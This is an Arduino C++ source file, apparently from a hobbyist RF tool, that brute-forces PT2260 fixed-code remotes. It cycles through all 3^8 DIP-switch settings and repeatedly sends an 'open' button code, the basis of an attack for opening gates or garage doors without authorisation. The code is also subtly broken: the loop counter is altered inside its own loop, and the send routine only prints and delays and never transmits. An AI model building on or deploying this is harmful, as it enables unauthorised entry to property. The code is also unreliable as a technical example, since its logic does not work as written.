#include <Arduino.h>
#include "modules/RFBrute/PT2260.h"
#include "modules/RF/CC1101.h"

// Transposition table for PT2260
const char *transpositionTable[2] = {"300 -850 ", "850 -300 "};
const char *stopBit = "300 -8800 ";
const int totalBits = 24;

// Function to send the raw signal
void sendSignal(uint32_t signal) {
    // Convert the signal to a string for the raw data format
    String rawData = "";

    // Build the raw data string from the binary signal
    for (int bitIndex = totalBits - 1; bitIndex >= 0; bitIndex--) {
        int bit = (signal >> bitIndex) & 1; // Extract the bit
        rawData += transpositionTable[bit]; // Append timing for the bit
    }
    rawData += stopBit; // Append the stop bit

    // Output the raw data to Serial (for debugging)
    Serial.println(rawData);

    // Send the signal according to the raw data timing
    for (int i = 0; i < rawData.length(); i++) {
        // Extract timing values from the raw data
        int timing = atoi(rawData.substring(i).c_str()); // Convert to integer
        while (rawData[i] != ' ' && i < rawData.length()) {
            i++;
        }
        delayMicroseconds(timing); // Wait for the timing duration
    }
}



void PT2260Loop() {
    // Generate and send signals for PT2260 protocol
    for (int dip = 0; dip < pow(3, 8); dip++) {
        uint32_t total = 0;

        // Build the signal based on the lookup table
        for (int j = 0; j < 8; j++) {
            int lutIndex = dip % 3; // Determine the value to use from the LUT
            total |= lutIndex << (2 * j); // Construct the signal
            dip /= 3;
        }

        total <<= 8;  // Shift to make space for the button code
        total |= 0b11; // Use the open button code (0b11)

        // Play the signal 5 times
        for (int playCount = 0; playCount < 5; playCount++) {
            sendSignal(total); // Send the generated signal
        }

        // Optional: Delay between signals to avoid flooding
        delay(100); // Adjust delay as necessary (in milliseconds)
    }
}
